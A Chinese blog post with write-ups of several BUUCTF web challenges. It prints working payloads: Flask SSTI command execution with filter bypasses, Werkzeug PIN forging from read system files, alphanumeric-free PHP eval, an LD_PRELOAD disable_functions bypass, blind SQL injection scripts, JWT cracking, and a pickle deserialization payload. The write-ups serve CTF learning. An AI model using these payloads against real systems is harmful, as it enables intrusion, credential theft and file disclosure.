将import, os, popen都换成字符串拼接的形式后,执行成功
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').__dict__['po'+'pen']('ls /').read() }}
{%endif%}
{%endfor%}
输出:
app bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys this_is_the_flag.txt tmp usr var
接下来读取flag: (这里发现flag也被过滤了,所以用同样的方法绕过):
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').__dict__['po'+'pen']('cat /this_is_the_fl'+'ag.txt').read() }}
{%endif%}
{%endfor%}
```



所以说提示里说要用到PIN,也没用到... 搜搜其他解法:

>PIN是 `Werkzeug`（它是` Flask` 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。 **您可以使用浏览器中的调试器引脚来启动交互式调试器。**
>
>请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。
>
>调试器 PIN 只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。
>
>`werkzeug`不同版本以及`python`不同版本都会影响PIN码的生成

如果需要伪造PIN码,需要:

- `username`, 读取`/etc/passwd`获得
- `modname`,默认值是`flask.app`
- `appname`,默认值是`Flask`
- 10进制的mac地址, 通过`/sys/class/net/eth0/address`获得十六进制格式,再转为10进制
- `machine_id` :读取文件`/etc/machine-id ` 或者 `/proc/sys/kernel/random/boot_id 3./proc/self/cgroup`
- `flask/app.py`的路径, 常见的有:`/usr/local/lib/python3.7/site-packages/flask/app.py`,通过报错等信息获得



```
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}
{%endif%}
{%endfor%}
输出中找到了一个名为 flaskweb的可疑用户

{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address').read() }}
{%endif%}
{%endfor%}
输出mac地址56:08:f5:2f:90:51, 转为10进制:94596473262161

{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__'].open('/etc/machine-id').read() }}
{%endif%}
{%endfor%}
machine-id: 1408f836b0ca514d796cbf8960e45fa1
```

运行脚本,生成pin:

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]
private_bits = [
    '94596473262161',  # mac地址  str(uuid.getnode()),  /sys/class/net/ens33/address
    '1408f836b0ca514d796cbf8960e45fa1'  # get_machine_id(), /etc/machine-id
]
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)

#输出: 961-361-247
```

在报错页面输入pin之后,成功进入python的交互页面:

![image-20221024164345369](/images/buuctf-web2/image-20221024164345369.png)



<br>

***

<br>

# [无字母数字rce,disable_function绕过]RCE ME

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>
```

很直白,过滤了字母数字, 需要进行无字母数字的`rce`

**利用取反性质来构造命令执行, 每一个字符取反之后都会变成另一个字符**

```php
//构造目标 eval($_POST[1])
//这里构造完之后执行会使网页爆500崩溃...

//构造目标 assert(eval($_POST[1]))
<?php
echo urlencode(~"assert");
echo '<br>';
echo urlencode(~"eval(\$_POST[1])");
echo '<br>';
?>
//%9E%8C%8C%9A%8D%8B --assert
//%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6 --eval(\$_POST[1])
    
//那么: assert(eval($_POST[1]))就是:
//?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);

//接下来在post中传参: 1=phpinfo();
```

成功执行

<img src="/images/buuctf-web2/image-20221024213819145.png" alt="image-20221024213819145" style="zoom:67%;" />

那么现在通过url和`post`参数就可以使用蚁剑连接了:

```
http://ce4afe32-8659-4ef4-ad14-633769a475a9.node4.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);
```

![image-20221024214143688](/images/buuctf-web2/image-20221024214143688.png)

但是因为这里开启了禁用函数`disable_functions`所以连接上 蚁剑之后也无法执行命令

而且这里直接打开flag什么也看不见,应该是需要执行旁边的readflag才行

![image-20221024215657536](/images/buuctf-web2/image-20221024215657536.png)

![image-20221024215334052](/images/buuctf-web2/image-20221024215334052.png)



这里使用`disable_function`的绕过工具:

https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD

将这两个文件`bypass_disablefunc.php`和`bypass_disablefunc_x64.so`上传到目标上(这里`/tmp`具有上传权限)

<img src="/images/buuctf-web2/image-20221024223546603.png" alt="image-20221024223546603" style="zoom:50%;" />

<img src="/images/buuctf-web2/image-20221024221953485.png" alt="image-20221024221953485" style="zoom:80%;" />

这里上传后需要访问到刚刚上传的php文件,并get传参执行命令:

>一是 cmd 参数，待执行的系统命令（如 pwd）；二是 outpath 参数，保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。此外，bypass_disablefunc.php 拼接命令和输出路径成为完整的命令行，所以你不用在 cmd 参数中重定向。

这里我们无法访问到`/tmp`目录的文件,所以通过刚刚的方法,在`POST`中执行一个文件包含函数:

然后再按照要求传`cmd`,`outpath`,`sopath`这三个参数

```
http://ce4afe32-8659-4ef4-ad14-633769a475a9.node4.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/tmp/bypass_disablefunc_x64.so

post:
1=include(%27/tmp/shell.php%27);
```

命令被成功执行:

![image-20221024223414176](/images/buuctf-web2/image-20221024223414176.png)

<br>

***

<br>

# [php字符串解析]套娃



源码中, 第一关:...

```php
<!--
//1st
$query = $_SERVER['QUERY_STRING']; 

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!'); //不能有下划线和(%5f是下划线的url编码) 
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
!-->
```

`$_SERVER['QUERY_STRING'] `就是附带的参数的键和值,例如:

```
http://localhost/aaa/index.php?p=222&q=333
$_SERVER['QUERY_STRING'] = "p=222&q=333";
```

这里利用PHP的字符串解析特性:

>**PHP在将查询字符串解析为变量时 会去掉开头的空格,并把一些特殊字符转化为下划线**

下一步绕过正则匹配,这里多传一个换行符, 这里正则默认是不匹配换行符的

所以传:

```
?b%20u%20p%20t=23333%0a
输出:
how smart you are ~

FLAG is in secrettw.php
```

进入`secrettw.php`,这里说`Local access only`, 可能需要加`xff`之类的头, 源码中发现了一串编码:

![image-20221025094059162](/images/buuctf-web2/image-20221025094059162.png)

>**这一串是`jsfuck`代码,将一切的`JavaScript`代码混淆为`[]()!+,\"$.:;_{}~=`这十八个字符的排列组合**
>
>**这些代码是直接可以在控制台执行的**

<img src="/images/buuctf-web2/image-20221025093937170.png" alt="image-20221025093937170" style="zoom:50%;" />



执行后弹出:`alert("post me Merak)"`,这里应该是需要post这个参数

![image-20221025094723388](/images/buuctf-web2/image-20221025094723388.png)

这里XFF头不起作用,所以更换为了`Client-IP`头, 同时按照要求POST一个Merak

得到了下一关的源码:

```php
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v);  # 先解码
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){  #解码后的每一个字符ord转为ascii码之后,加上i*2
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?> 
```

这里首先需要满足: `file_get_contents($_GET['2333']) === 'todat is a happy day'`, 通过`data://`伪协议即可:

```
2333=data://text/plain,todat is a happy day
```

下一步需要通过file参数来读取`flag.php` , 这里`file`参数会经过`change`的处理, 传入编码后的字符串,解码后将每一位的`ascii`码都加上当前数组下标值得两倍

那么反过来将`flag.php`每一位的ascii码都减去下标的两倍就得到 : `fj]a&f\b`, 再将其编码之后作为参数传进去就行了:

```
secrettw.php?2333=data://text/plain,todat is a happy day&file=ZmpdYSZmXGI=
```

注意这里要把上一步传的`Merak`删掉,不然会在判定该参数是否存在时直接退出.

查看源码得到flag

<br>

***

<br>

# [逻辑盲注]颜值成绩查询

注入题,先尝试输入一些payload看看注入点在哪

```
http://22ad9de1-c8df-47c0-8c13-822750f017cf.node4.buuoj.cn:81/?stunum=2#
```

<img src="/images/buuctf-web2/image-20221025123129925.png" alt="image-20221025123129925" style="zoom:67%;" />



存在逻辑注入:

```
(1^1)
```

![image-20221025123522202](/images/buuctf-web2/image-20221025123522202.png)

```
(3&&2)
```

![image-20221025123727768](/images/buuctf-web2/image-20221025123727768.png)

数据库名长度

```
(1&&(length(database())=4))   ---student number not exists.
(1&&(length(database())=3))   ---Hi admin, your score is: 100
```

后面使用上面的方法就爆不出数据库名了,不知道为什么

```
(1&&ascii((substr(database(),1,1))=ord(c))))
```

把`&&`换成`and`,这里发现空格被过滤

```
1/**/and/**/1=1#
Hi admin, your score is: 100
1 and 1=1#
student number not exists.
```

爆数据库名:

```python
import requests
import string
chars = string.printable[:]  #返回所有可打印的字母，数字，符号的集合
base_url = "http://bb625ab1-7046-49f8-923e-d3312349b26f.node4.buuoj.cn:81/?stunum="
session = requests.session()
def get_database_name(length):
    database_name = ""
    i = 1
    while i < length+1:
        for c in chars:
            payload = "1/**/and/**/(substr(database(),{},1)='{}')#".format(i, c)
            url = base_url + payload
            print(url)
            res = session.get(url).text
            # print(res)
            if "Hi admin, your score is: 100" in res:
                database_name += c
                print(database_name)
                break
        i = i + 1
get_database_name(3)

# 库名: ctf
```

爆表名:

```python
def get_table_name():
    tables_name = ""
    for i in range(1,30):
        for c in chars:
            payload = "1/**/and/**/(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='ctf'),{},1)='{}')#".format(i, c)
            url = base_url + payload
            print(url)
            res = session.get(url).text
            # print(res)
            if "Hi admin, your score is: 100" in res:
                tables_name += c
                print(tables_name)
                break
// 表名:flag
```



爆列名:

```python
def get_column_name():
    column_name = ""
    for i in range(1,30):
        for c in chars:
            payload = "1/**/and/**/(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),{},1)='{}')#".format(i, c)
            url = base_url + payload
            print(url)
            res = session.get(url).text
            # print(res)
            if "Hi admin, your score is: 100" in res:
                column_name += c
                print(column_name)
                break
//列名: flag,value
```

爆数据:

```python
def get_data():
    data = ""
    for i in range(1,300):
        for c in chars:
            payload = "1/**/and/**/(substr((select/**/group_concat(value)/**/from/**/flag),{},1)='{}')#".format(i, str(c))
            url = base_url + payload
            print(url)
            res = session.get(url).text
            # print(res)
            if "Hi admin, your score is: 100" in res:
                data += c
                print(data)
                break
//flag{debd4fbe-9cc4-4e30-9f3e-6a2ad2b04eb5}
```

<br>

***

<br>

# [换行符绕正则]RCEService

<img src="/images/buuctf-web2/image-20221025144311248.png" alt="image-20221025144311248" style="zoom:67%;" />

需要输入`json`格式的命令,现场时让键为`command`发现被过滤了,换成`cmd`成功

```
{"command":"whoami"}
{"cmd":"whoami"}
{"cmd":"ls"}
```

![image-20221025144755368](/images/buuctf-web2/image-20221025144755368.png)

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}
?>
```

**使用换行符**来绕过`preg_match`

```
cmd={%0a"cmd":"ls%20/"%0a}
bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var

cmd={%0a"cmd":"ls%20/home/rceservice"%0a}
flag jail

cmd={%0a"cmd":"tac%20/home/rceservice/flag"%0a}
这里试了几个读文件的命令,都无法执行

直接使用绝对路径来执行命令
cmd={%0a"cmd":"ls%20/bin"%0a}
bash bunzip2 bzcat bzcmp bzdiff bzegrep bzexe bzfgrep bzgrep bzip2 bzip2recover bzless bzmore cat chgrp chmod chown cp dash date dd df dir dmesg dnsdomainname domainname echo egrep false fgrep findmnt grep gunzip gzexe gzip hostname kill ln login ls lsblk mkdir mknod mktemp more mount mountpoint mv nisdomainname pidof ps pwd rbash readlink rm rmdir run-parts sed sh sleep stty su sync tar tempfile touch true umount uname uncompress vdir wdctl which ypdomainname zcat zcmp zdiff zegrep zfgrep zforce zgrep zless zmore znew

cmd={%0a"cmd":"/bin/cat%20/home/rceservice/flag"%0a}
flag{d45d20f3-c8ef-45b6-9851-075783c8a91b}
```

这里还有个小知识点,这里看到存在` /home/rceservice/jail`

> putenv 相当于一个简陋的沙盒, 让 shell 默认从 `/home/rceservice/jail` 下寻找命令, 后面看的时候发现这个目录下只有一个 ls, 但其实使用绝对路径执行命令 (/bin/cat) 就能够绕过限制了

<br>

***

<br>

# [basename]Can you guess it?

```php+HTML
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) { //这里匹配config.php/结尾的字符串
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF'])); //当前php文件对于网站根目录的相对地址
  exit();
}

$secret = bin2hex(random_bytes(64)); //转为16进制之后为长度为128的字符串
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {  //比较两个字符串
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
```

这里猜数估计是猜不出来了

漏洞在`basename`那里, 该函数用于返回路径中的文件名部分,例如:

```
basename("/testweb/home.php") = "home.php"

如果设置了扩展名,则输出是不包含扩展名
basename("/testweb/home.php",".php") = "home"
```

`basename`在解析文件路径时,会忽略一部分非`ASCII`字符

可以测试一下有哪些字符会被忽略:

```php
<?php
highlight_file(__FILE__);
$filename = 'index.php';
for($i=0; $i<255; $i++){
    $filename = $filename.'/'.chr($i);    //变为 index/某字符
    if(basename($filename) === "index.php"){  //如果basename将"/某字符"删除, 则说明这个字符会被其忽略
        echo $i.'<br>';
    }
    $filename = 'index.php';
}
```

结果显示: `ascii`值为47、128-255的字符均会被其删除,其中47为"/", 另外会被删除的还包括汉字和中文标点

那么在本题中, 要绕过匹配,则可以传`config.php/%ff` 这里`%ff`在后面会被`basename`删除,所以不影响读取该文件, 而题目中的正则表达式尾部时`$`,表示匹配尾部为`config.php/`的字符串,而这里在尾部又加了其他字符,所以也就匹配不到了

另外, 必须给`index.php`传参`source`才能触发读取文件,所以最后的payload可以为:

```
http://96993b6d-bf64-4b7c-be18-69e708540bca.node4.buuoj.cn:81/index.php/config.php/%ff?source=1
```

这里传`/index.php/config.php`不影响访问`index.php`

而在`basename`处理时,其会首先删除路径部分, 也就是`index.php/`,然后删除后面`%ff`,最后的结果为`config.php`,成功读取



<br>

***

<br>

# [脚本爆破,JWT,pickle反序列化]ikun



![image-20221025183851502](/images/buuctf-web2/image-20221025183851502.png)

![image-20221025185149755](/images/buuctf-web2/image-20221025185149755.png)



这里说要买到lv6 ,但是不知道是那一页 ,所以先用脚本跑一下:

```python
import requests
import time
base_url = "http://1abf08df-2767-4d81-a779-7356c6c5e545.node4.buuoj.cn:81/shop?page="
session = requests.session()
cookies = {'_xsrf': '2|c3cd89d3|eee6aaae103a266c0069323a94da635e|1666692736',
           'JWT': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIyMiJ9.3H1j76lr69MYIZ48VY1Jdrjpw-GZdPSSbEwpE0gCR8o'
        }
for i in range(1,500):
    time.sleep(0.5)
    url = base_url + str(i)
    print(url)
    res = session.get(url, cookies=cookies).text
    # print(res)
    if "lv6.png" in res:
        print(i)
        break
```

在180页发现了lv6

![image-20221025185317801](/images/buuctf-web2/image-20221025185317801.png)

但是很贵,根本买不起

<img src="/images/buuctf-web2/image-20221025185716790.png" alt="image-20221025185716790" style="zoom:67%;" />

抓包修改价格会显示操作失败, 修改折扣后成功, 出现了 `/b1g_m4mber `这个地址

访问后会显示只允许`admin`访问,这里尝试添加头字段失败后,注意到包中还有`JWT`这个字段:

![image-20221025190252201](/images/buuctf-web2/image-20221025190252201.png)



>`JWT`的全称是`JSON Web Token`。遵循JSON格式，跨域认证解决方案。声明被存储在`客户端`，而不是服务端内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于`token`的身份验证可以替代传统的cookie+session身份验证方法。
>
>整个`token`由三部分组成:`header`、`payload`、`signature`(用于认证信息的完整性)
>
>其中,`header`的格式为
>
>```json
>{
>  "alg": "HS256",   //signature部分的加密算法,可以为None,
>  "typ": "JWT"      //声明类型为JWT
>}
>```
>
>`payload`格式为:
>
>```json
>{
>    "user_role" : "finn",    	//当前登录用户
>    "iss": "admin",          	//该JWT的签发者,有些是URL
>    "iat": 1573440582,        //签发时间
>    "exp": 1573940267,        //过期时间
>    "nbf": 1573440582,        //该时间之前不接收处理该Token
>    "domain": "example.com",   //面向的用户
>    "jti": "dff4214121e83057655e10bd9751d657"   //Token唯一标识
>}
>```
>
>`signature`通过指定的加密算法, **以及一个用户指定的`secret_key`,** 对`header`、`payload`两部分进行计算得到. 签名可以为空,如果这样设置, 任何token都可以通过服务器的认证
>
>`header`、`payload`使用`base64url`编码, 所以和明文没什么区别



使用`c-jwt-cracker`工具可以对用于计算`signature`进行爆破 (只能爆破弱密钥)

使用`jwt_tool`可以对`JWT token`进行解码

```
┌──(kali㉿kali)-[~/Desktop/c-jwt-cracker/c-jwt-cracker]
└─$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIyMiJ9.3H1j76lr69MYIZ48VY1Jdrjpw-GZdPSSbEwpE0gCR8o   
Secret is "1Kun"

python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.03HaDCk7C7vfJw9Wa-yDflSMoeV_1jpCaTILcgJXpZY

```

![image-20221025193722302](/images/buuctf-web2/image-20221025193722302.png)

https://jwt.io/

这里拿到爆破所得的`secret_key`, 并在解密后将`payload`中的`username`字段的值改为`admin`

从而计算得到一个新的`JWT token`

<img src="/images/buuctf-web2/image-20221025194112546.png" alt="image-20221025194112546" style="zoom:67%;" />

用新`token`来访问`/b1g_m4mber `,成功

```
JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
```



<img src="/images/buuctf-web2/image-20221025194237910.png" alt="image-20221025194237910" style="zoom:80%;" />

去下载`"/static/asd1f654e683wq/www.zip"`

翻一下代码, 在`admin.py`中找到了可利用的`pickle`反序列化漏洞:

```python
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

这里对传进来的参数`become`用`unquote`解码之后, 使用`pickle.loads`来进行反序列化

这么这里就需要在`become`中构建序列化的字符串: (这里需要使用python2)

```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
print a
a = urllib.quote(a)
print a

"""
输出:
c__builtin__
eval
p0
(S"open('/flag.txt','r').read()"
p1
tp2
Rp3
.
c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
"""
```

然后将最后这个编码后的字符串传给`become`参数

这里使用burpsuite传参时会一直403, 那么直接使用浏览器: 先使用hackbar添加cookie中的`JWT`从而访问到`/b1g_m4mber`

对比bp和浏览器: 浏览器中好像少了个输入框

![image-20221025225155819](/images/buuctf-web2/image-20221025225155819.png)

在`元素`中搜索`become`看看这个参数是在哪传的:

![image-20221025225310131](/images/buuctf-web2/image-20221025225310131.png)

可以看到输入`become`的位置加了隐藏`hidden`属性

这里将这个属性删除, 发现出现了输入框,将前面得出的payload输入:然后点击按钮, flag就被读取出来了

<img src="/images/buuctf-web2/image-20221025225510518.png" alt="image-20221025225510518" style="zoom:67%;" />

<br>

***

<br>



# [FlaskSSTI,bypass]FlaskLight

<img src="/images/buuctf-web2/image-20221026094350556.png" alt="image-20221026094350556" style="zoom:67%;" />

存在`SSTI`

```
?search={{config}}

<Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_NAME': 'session', 'MAX_COOKIE_SIZE': 4093, 'SESSION_COOKIE_SAMESITE': None, 'PROPAGATE_EXCEPTIONS': None, 'ENV': 'production', 'DEBUG': False, 'SECRET_KEY': 'CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}', 'EXPLAIN_TEMPLATE_LOADING': False, 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': '/', 'SERVER_NAME': None, 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': False, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'TEMPLATES_AUTO_RELOAD': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'JSON_SORT_KEYS': True, 'JSONIFY_MIMETYPE': 'application/json', 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'TRAP_HTTP_EXCEPTIONS': False}>

SECRET_KEY: CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}
这个没什么用
```

读文件:

```
search={{[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
疑似用户:www-data
```

下面尝试命令执行的时候发现过滤了很多关键词

查找基类和子类都没有问题

```
{{[].__class__.__bases__[0]}}
输出:<type 'object'>
{{[].__class__.__bases__[0].__subclasses__()}}
输出子类列表
{{[].__class__.__bases__[0].__subclasses__()[59]}}
输出<class 'warnings.catch_warnings'>
```

具体执行命令时会爆500

```
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
500
```

两种绕过方法:

1.通过`request.args.x`使用其他参数来传关键词

```
?search={{[].__class__.__bases__[0].__subclasses__()[59][request.args.a][request.args.b][request.args.c][request.args.d](request.args.e)}}&a=__init__&b=__globals__&c=__builtins__&d=eval&e=__import__('os').popen('ls').read()

bin boot dev etc flasklight home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var

/flasklight : app.py coomme_geeeett_youur_flek

?search={{[].__class__.__bases__[0].__subclasses__()[59][request.args.a][request.args.b][request.args.c][request.args.d](request.args.e)}}&a=__init__&b=__globals__&c=__builtins__&d=eval&e=__import__('os').popen('cat /flasklight/coomme_geeeett_youur_flek').read()
flag{add0f032-3cdb-40b9-aa25-cd53d5c146fd}
```

2.字符串拼接:

```
{{[].__class__.__bases__[0].__subclasses__()[59].__init__["__glo"+"bals__"]['__bui'+'ltins__']['ev'+'al']("__import__('os').popen('ls').read()")}}
```



<br>

***

<br>

# [伪随机数]枯燥的抽奖

这种一般都不能硬猜吧

<img src="/images/buuctf-web2/image-20221026100046964.png" alt="image-20221026100046964" style="zoom:80%;" />

源码发现了`check'.php`

![image-20221026100104694](/images/buuctf-web2/image-20221026100104694.png)

访问拿到代码

```php
chcRo2MtG9

<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
} //对于同一个种子来说, 这20轮循环中每次随机到的数都是相同的
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```



>伪随机数是用确定性的算法计算出来的随机数序列，它并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>若使用的初值（种子）不变，那么伪随机数的数序也不变</span>:。伪随机数可以用计算机大量生成，在模拟研究中为了提高模拟效率，一般采用伪随机数代替真正的随机数。模拟中使用的一般是循环周期极长并能通过随机数检验的伪随机数，以保证计算结果的随机性。伪随机数的生成方法有线性同余法、单向散列函数法、密码法等。
>
>**`mt_rand`就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。**

这里可以用`php_mt_seed`来爆破种子, 有两种类型的数据可以提交, 一是某个种子的第一个`mt_rand`生成出来的完整数, 或者提交已知的多个随机数序列,使用方法为:

```
php_mt_seed xxx  这里xxx是用 mt_srand 播种后生成的第一个伪随机数
php_mt_seed a1 b1 c1 d1 a2 b2 c2 d2 a3 b3 c3 d3  其中a1,b1为在某个范围内生成的随机数, c1,d1是生成随机数时mt_rand指定的生成范围
例如第一次调用mt_rand(0,61) = 2 第二次调用mt_rand(0,61) = 30
那么这里就是php_mt_seed 2 2 0 61 30 30 0 61
```

那么使用脚本将目前已知的串转化为上面的形式

```python
a = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
b = "chcRo2MtG9"

string = ""

for c in b:
    string += str(a.index(c)) + ' ' + str(a.index(c)) + ' 0 61 '
print(string)

输出:
2 2 0 61 7 7 0 61 2 2 0 61 53 53 0 61 14 14 0 61 28 28 0 61 48 48 0 61 19 19 0 61 42 42 0 61 35 35 0 61 
```

利用`php_mt_seed`来爆破种子

```
